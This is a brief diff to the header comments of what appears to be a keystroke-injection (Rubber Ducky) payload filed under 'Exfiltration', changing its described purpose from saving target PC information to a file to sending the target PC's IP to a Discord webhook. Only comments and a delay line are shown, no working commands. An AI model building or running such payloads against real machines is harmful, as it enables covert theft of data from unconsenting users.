@@ -1,5 +1,5 @@
 REM Author: Startrk1995
-REM Description: Saves some general Information about the target pc to a file.
+REM Description: Saves the IP of the target pc to a discord webhook.
 REM Version:	1.0
 REM Category:	Exfiltration
 DELAY 500
